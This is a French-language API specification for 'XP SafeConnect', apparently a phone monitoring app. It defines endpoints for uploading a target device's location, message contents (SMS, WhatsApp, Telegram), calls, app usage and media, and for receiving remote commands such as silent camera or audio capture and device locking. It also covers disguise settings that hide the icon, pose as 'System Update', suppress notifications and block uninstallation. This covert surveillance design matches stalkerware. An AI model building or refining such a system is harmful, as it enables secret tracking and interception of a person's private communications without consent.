# API Endpoints pour l'Application Surveillée - XP SafeConnect

## Table des Matières

1. [Vue d'ensemble](#vue-densemble)
2. [Authentification et Configuration](#authentification-et-configuration)
3. [Collecte et Envoi de Données](#collecte-et-envoi-de-données)
4. [Réception de Commandes](#réception-de-commandes)
5. [Gestion du Statut et de la Santé](#gestion-du-statut-et-de-la-santé)
6. [WebSocket pour Communication Temps Réel](#websocket-pour-communication-temps-réel)
7. [Gestion des Erreurs](#gestion-des-erreurs)
8. [Codes d'Erreur Spécifiques](#codes-derreur-spécifiques)

---

## Vue d'ensemble

Ce document décrit tous les endpoints API destinés spécifiquement à **l'application surveillée** (l'appareil dont on veut obtenir des informations à distance ou mener des actions distantes). Ces endpoints permettent à l'application surveillée de :

- S'authentifier et récupérer sa configuration
- Envoyer les données collectées (localisation, messages, appels, etc.)
- Recevoir et traiter les commandes à distance
- Maintenir une communication en temps réel via WebSocket
- Signaler son état de fonctionnement

### Architecture Générale

- **Base URL** : `https://api.safeconnect.com/api/v1/`
- **Format** : JSON (application/json)
- **Authentification** : JWT Bearer Token ou Token Authentication
- **Headers requis** :
```
Content-Type: application/json
Accept: application/json
Authorization: Bearer <access_token>
X-App-Version: 1.0.0
X-Platform: android|ios
X-Device-ID: <device_unique_id>
```

---

## Authentification et Configuration

### 1. POST /auth/login
**Description** : Authentifier l'appareil surveillé et obtenir les tokens d'accès

**Utilisation** : L'application surveillée doit s'authentifier pour accéder aux autres endpoints

**Body** :
```json
{
  "email": "user@example.com",
  "password": "SecurePass123!",
  "device_info": {
    "device_id": "unique_device_identifier",
    "platform": "android",
    "os_version": "13",
    "model": "Pixel 7",
    "manufacturer": "Google",
    "fcm_token": "firebase_token_for_push_notifications"
  }
}
```

**Réponse 200** :
```json
{
  "status": "success",
  "data": {
    "user": {
      "id": "uuid",
      "email": "user@example.com",
      "first_name": "Jean",
      "last_name": "Dupont"
    },
    "tokens": {
      "access": "jwt_access_token",
      "refresh": "jwt_refresh_token"
    },
    "device": {
      "id": "device_uuid",
      "is_monitored": true,
      "is_monitoring": false,
      "display_mode": "DISCRETE"
    }
  }
}
```

**Gestion d'erreurs** :
- **401** : Identifiants invalides
- **403** : Compte non actif ou non vérifié
- **429** : Trop de tentatives de connexion

---

### 2. GET /data/collection-config/
**Description** : Récupérer la configuration de collecte de données pour l'appareil

**Utilisation** : Permet à l'application surveillée de savoir quelles données collecter et à quelle fréquence

**Query Parameters** :
- `device_id` (obligatoire) : UUID de l'appareil

**Headers** :
```
Authorization: Bearer <access_token>
```

**Réponse 200** :
```json
{
  "location": {
    "enabled": true,
    "interval_seconds": 900,
    "accuracy": "BALANCED",
    "battery_save_mode": false
  },
  "messages": {
    "enabled": true,
    "types": ["SMS", "MMS", "WHATSAPP", "TELEGRAM", "MESSENGER"],
    "include_content": true
  },
  "calls": {
    "enabled": true,
    "record_calls": false
  },
  "app_usage": {
    "enabled": true,
    "interval_minutes": 30
  },
  "media": {
    "enabled": true,
    "scan_interval_hours": 24,
    "include_thumbnails": false
  }
}
```

**Logique d'ajustement automatique** :
- Mode économie d'énergie si batterie < 20%
- Désactivation si aucune permission de surveillance accordée
- Configuration premium vs gratuite selon l'abonnement

**Gestion d'erreurs** :
- **400** : device_id manquant
- **403** : Pas d'autorisation pour cet appareil
- **404** : Appareil introuvable

---

### 3. GET /devices/devices/{device_id}/
**Description** : Obtenir les détails et paramètres de l'appareil

**Utilisation** : Récupérer les informations de configuration et de statut de l'appareil

**Réponse 200** :
```json
{
  "id": "device_uuid",
  "name": "Téléphone de Marie",
  "device_identifier": "unique_device_id",
  "platform": "ANDROID",
  "os_version": "13",
  "model": "Galaxy S23",
  "is_monitoring": false,
  "is_monitored": true,
  "is_online": true,
  "last_seen": "2024-01-01T12:00:00Z",
  "battery_level": 85,
  "is_charging": false,
  "display_mode": "DISCRETE",
  "settings": {
    "location_interval_seconds": 900,
    "record_calls": false,
    "include_thumbnails": false,
    "auto_sync_frequency": 15
  }
}
```

---

## Collecte et Envoi de Données

### 4. POST /data/collect/
**Description** : Envoyer des données collectées d'un type spécifique

**Utilisation** : Point d'entrée principal pour envoyer les données collectées en temps réel

**Body** :
```json
{
  "device_id": "device_uuid",
  "data_type": "location|messages|calls|app_usage|media",
  "items": [
    {
      // Structure spécifique selon le type de données
    }
  ],
  "metadata": {
    "collection_timestamp": "2024-01-01T12:00:00Z",
    "battery_level": 85,
    "network_type": "wifi",
    "app_version": "1.0.0"
  }
}
```

**Exemples par type de données** :

#### Localisation (`data_type: "location"`)
```json
{
  "device_id": "device_uuid",
  "data_type": "location",
  "items": [
    {
      "latitude": 48.8566,
      "longitude": 2.3522,
      "accuracy": 10.5,
      "altitude": 35.0,
      "speed": 0,
      "bearing": 90,
      "recorded_at": "2024-01-01T12:00:00Z",
      "activity_type": "STILL",
      "provider": "GPS"
    }
  ]
}
```

#### Messages (`data_type: "messages"`)
```json
{
  "device_id": "device_uuid", 
  "data_type": "messages",
  "items": [
    {
      "message_type": "SMS",
      "direction": "INCOMING",
      "sender": "+33612345678",
      "sender_name": "Marie",
      "body": "Salut, ça va ?",
      "sent_at": "2024-01-01T12:00:00Z",
      "conversation_id": "conv_123",
      "has_attachment": false
    }
  ]
}
```

#### Appels (`data_type: "calls"`)
```json
{
  "device_id": "device_uuid",
  "data_type": "calls", 
  "items": [
    {
      "call_type": "INCOMING",
      "phone_number": "+33612345678",
      "contact_name": "Marie",
      "start_time": "2024-01-01T12:00:00Z",
      "end_time": "2024-01-01T12:03:00Z",
      "duration": 180,
      "is_video_call": false
    }
  ]
}
```

#### Utilisation d'applications (`data_type: "app_usage"`)
```json
{
  "device_id": "device_uuid",
  "data_type": "app_usage",
  "items": [
    {
      "package_name": "com.whatsapp",
      "app_name": "WhatsApp",
      "category": "COMMUNICATION",
      "start_time": "2024-01-01T12:00:00Z",
      "end_time": "2024-01-01T12:05:00Z",
      "duration_seconds": 300,
      "launch_count": 1
    }
  ]
}
```

#### Médias (`data_type: "media"`)
```json
{
  "device_id": "device_uuid",
  "data_type": "media",
  "items": [
    {
      "media_type": "PHOTO",
      "file_name": "IMG_20240101_120000.jpg",
      "file_path": "/storage/emulated/0/DCIM/Camera/IMG_20240101_120000.jpg",
      "mime_type": "image/jpeg",
      "file_size": 2048576,
      "width": 4000,
      "height": 3000,
      "created_at": "2024-01-01T12:00:00Z",
      "modified_at": "2024-01-01T12:00:00Z"
    }
  ]
}
```

**Réponse 200** :
```json
{
  "success": true,
  "processed_items": 5,
  "failed_items": 0,
  "message": "Données traitées avec succès",
  "sync_id": "sync_uuid"
}
```

**Gestion d'erreurs** :
- **400** : Paramètres manquants ou format invalide
- **403** : Pas d'autorisation pour cet appareil
- **413** : Payload trop volumineux
- **422** : Données invalides dans items

---

### 5. POST /data/collect/bulk/
**Description** : Envoyer des données de plusieurs types en une seule requête

**Utilisation** : Optimisation pour envoyer des données groupées et réduire le nombre de requêtes

**Body** :
```json
{
  "device_id": "device_uuid",
  "data_batches": [
    {
      "data_type": "location",
      "items": [/* données de localisation */],
      "metadata": {
        "collection_method": "background"
      }
    },
    {
      "data_type": "messages", 
      "items": [/* données de messages */],
      "metadata": {
        "collection_method": "notification_listener"
      }
    }
  ],
  "metadata": {
    "sync_timestamp": "2024-01-01T12:00:00Z",
    "battery_level": 85,
    "network_type": "wifi"
  }
}
```

**Réponse 200** :
```json
{
  "device_id": "device_uuid",
  "processed_batches": 2,
  "results": [
    {
      "data_type": "location",
      "result": {
        "success": true,
        "processed_items": 10
      }
    },
    {
      "data_type": "messages",
      "result": {
        "success": true, 
        "processed_items": 5
      }
    }
  ]
}
```

---

## Réception de Commandes

### 6. GET /devices/devices/{device_id}/disguise_settings/
**Description** : Récupérer les paramètres de camouflage de l'appareil

**Utilisation** : Obtenir la configuration pour le mode discret et les paramètres de camouflage

**Réponse 200** :
```json
{
  "stealth_mode": true,
  "disguise_settings": {
    "hide_app_icon": true,
    "fake_app_name": "System Update",
    "fake_app_icon": "system_icon_url",
    "silent_notifications": true,
    "hide_from_recent_apps": true
  },
  "access_settings": {
    "secret_code": "**hidden**",
    "access_method": "dial_code",
    "emergency_reveal": false
  }
}
```

### 7. POST /devices/devices/{device_id}/validate_access/
**Description** : Valider un code d'accès pour accéder aux paramètres

**Utilisation** : Vérifier les codes secrets pour accéder aux fonctions cachées

**Body** :
```json
{
  "access_method": "dial_code|gesture|voice",
  "access_code": "secret_code_or_pattern"
}
```

**Réponse 200** :
```json
{
  "valid": true,
  "permissions": ["view_settings", "change_mode", "emergency_functions"],
  "session_token": "temp_access_token"
}
```

**Réponse 403** :
```json
{
  "valid": false,
  "detail": "Code d'accès invalide",
  "attempts_remaining": 2
}
```

---

## Gestion du Statut et de la Santé

### 8. PATCH /devices/devices/{device_id}/
**Description** : Mettre à jour les informations de statut de l'appareil

**Utilisation** : Signaler régulièrement l'état de l'appareil au serveur

**Body** :
```json
{
  "battery_level": 85,
  "is_charging": false,
  "is_online": true,
  "last_sync": "2024-01-01T12:00:00Z",
  "storage_available": 1024000000,
  "network_type": "wifi",
  "location_enabled": true,
  "permissions_status": {
    "location": "granted",
    "camera": "granted", 
    "microphone": "granted",
    "contacts": "granted",
    "storage": "granted"
  }
}
```

**Réponse 200** :
```json
{
  "status": "success",
  "updated_fields": ["battery_level", "is_charging", "last_sync"],
  "server_time": "2024-01-01T12:01:00Z"
}
```

### 9. GET /data/database-statistics/
**Description** : Obtenir des statistiques sur l'utilisation de la base de données

**Utilisation** : Monitoring et diagnostics pour l'appareil

**Réponse 200** :
```json
{
  "total_records": 5000,
  "records_by_type": {
    "location": 2000,
    "messages": 1500,
    "calls": 800,
    "app_usage": 500,
    "media": 200
  },
  "storage_usage_mb": 50.5,
  "last_cleanup": "2024-01-01T00:00:00Z"
}
```

---

## WebSocket pour Communication Temps Réel

### 10. WebSocket /ws/device/{device_id}/
**Description** : Connexion WebSocket pour communication bidirectionnelle temps réel

**Utilisation** : Recevoir des commandes instantanées et envoyer des notifications d'urgence

#### Connexion
```
URL: wss://api.safeconnect.com/ws/device/{device_id}/?token={jwt_token}
```

#### Messages entrants (commandes du serveur)

##### Commande de verrouillage
```json
{
  "type": "device_command",
  "command": "lock_device",
  "lock_message": "Appareil verrouillé à distance",
  "unlock_code": "1234",
  "timestamp": "2024-01-01T12:00:00Z"
}
```

##### Commande de capture
```json
{
  "type": "device_command", 
  "command": "capture_media",
  "media_type": "screenshot|photo|audio",
  "options": {
    "camera": "front|back",
    "duration": 30,
    "silent": true,
    "high_quality": false
  }
}
```

##### Mise à jour des paramètres de camouflage
```json
{
  "type": "device_command",
  "command": "update_disguise_settings",
  "changes": {
    "stealth_mode": true,
    "hide_app_icon": true,
    "silent_notifications": true
  }
}
```

##### Configuration de protection anti-désinstallation
```json
{
  "type": "device_command",
  "command": "configure_protection",
  "protection_level": "high|medium|low",
  "settings": {
    "prevent_uninstall": true,
    "admin_lock": true,
    "backup_before_removal": true
  }
}
```

#### Messages sortants (de l'appareil vers le serveur)

##### Mise à jour de statut
```json
{
  "type": "status_update",
  "status": "online",
  "battery": 85,
  "is_charging": false,
  "location": {
    "latitude": 48.8566,
    "longitude": 2.3522,
    "accuracy": 10
  },
  "timestamp": "2024-01-01T12:00:00Z"
}
```

##### Réponse à une commande
```json
{
  "type": "command_response",
  "command_id": "cmd_uuid",
  "success": true,
  "message": "Commande exécutée avec succès",
  "result": {
    "action_taken": "device_locked",
    "details": {}
  }
}
```

##### Notification d'urgence
```json
{
  "type": "emergency",
  "trigger_type": "manual|voice|automatic",
  "severity": "high|medium|low",
  "location": {
    "latitude": 48.8566,
    "longitude": 2.3522,
    "accuracy": 10
  },
  "description": "Urgence détectée",
  "timestamp": "2024-01-01T12:00:00Z"
}
```

##### Heartbeat
```json
{
  "type": "heartbeat",
  "timestamp": "2024-01-01T12:00:00Z"
}
```

##### Demande de synchronisation
```json
{
  "type": "sync_request",
  "sync_type": "manual|auto|emergency",
  "data_types": ["location", "messages", "calls"],
  "priority": "high|normal|low"
}
```

---

## Gestion des Erreurs

### Format Standard des Erreurs

Toutes les réponses d'erreur suivent ce format :

```json
{
  "status": "error",
  "message": "Description générale de l'erreur",
  "errors": [
    {
      "field": "nom_du_champ",
      "code": "CODE_ERREUR",
      "message": "Description détaillée"
    }
  ],
  "error_code": "CATEGORIE_ERREUR",
  "request_id": "req_uuid",
  "timestamp": "2024-01-01T12:00:00Z"
}
```

### Gestion des Erreurs de Connectivité

L'application surveillée doit gérer les situations de connectivité limitée :

1. **Mode hors ligne** : Stocker les données localement
2. **Reconnexion** : Synchroniser automatiquement les données en attente
3. **Retry logic** : Tentatives répétées avec backoff exponentiel
4. **Priorisation** : Envoyer les données critiques en premier

### Exemple de Logic de Retry

```pseudo
for attempt in range(1, max_retries + 1):
    try:
        response = send_data(endpoint, data)
        if response.status_code == 200:
            break
    except ConnectionError:
        if attempt == max_retries:
            store_locally(data)
        else:
            sleep(2 ** attempt)  # Backoff exponentiel
```

---

## Codes d'Erreur Spécifiques

### Erreurs d'Authentification
- **4001** : Token WebSocket manquant
- **4002** : Token WebSocket invalide
- **4003** : Permissions insuffisantes pour l'appareil

### Erreurs de Validation de Données
- **INVALID_DEVICE_ID** : ID d'appareil invalide ou introuvable
- **INVALID_DATA_TYPE** : Type de données non supporté
- **INVALID_TIMESTAMP** : Format de timestamp incorrect
- **DATA_TOO_OLD** : Données trop anciennes (> 7 jours)
- **DUPLICATE_DATA** : Données déjà reçues

### Erreurs de Permissions
- **DEVICE_NOT_MONITORED** : Appareil non configuré pour la surveillance
- **MONITORING_PERMISSION_REVOKED** : Permission de surveillance révoquée
- **SUBSCRIPTION_REQUIRED** : Fonctionnalité nécessitant un abonnement premium

### Erreurs de Commandes
- **COMMAND_NOT_SUPPORTED** : Commande non supportée par l'appareil
- **DEVICE_OFFLINE** : Impossible d'envoyer la commande (appareil hors ligne)
- **COMMAND_EXECUTION_FAILED** : Échec de l'exécution de la commande
- **INVALID_COMMAND_PARAMETERS** : Paramètres de commande invalides

### Recommandations pour la Gestion d'Erreurs

1. **Logging détaillé** : Enregistrer toutes les erreurs avec contexte
2. **Retry automatique** : Pour les erreurs temporaires (5xx, timeouts)
3. **Fallback** : Mécanismes de sauvegarde pour les fonctions critiques
4. **User feedback** : Notifications discrètes en cas de problème persistant
5. **Health monitoring** : Surveillance de la santé de l'application

---

## Recommandations d'Implémentation

### Sécurité
- Chiffrer les données sensibles avant envoi
- Valider tous les tokens régulièrement
- Implémenter la rotation automatique des tokens
- Utiliser des certificats SSL pinning

### Performance
- Compresser les données avant envoi
- Utiliser la mise en cache locale
- Optimiser les requêtes selon la qualité du réseau
- Implémenter un système de queue pour les requêtes

### Robustesse
- Gérer les interruptions de réseau
- Implémenter des mécanismes de retry intelligents
- Surveiller l'état de la batterie et ajuster le comportement
- Prévoir des modes dégradés

### Conformité
- Respecter les politiques de confidentialité
- Implémenter les consentements requis
- Permettre la révocation des permissions
- Auditer toutes les actions sensibles

---

*Ce document constitue la spécification complète des endpoints API destinés à l'application surveillée. Il doit être utilisé comme référence pour l'implémentation côté client mobile.* 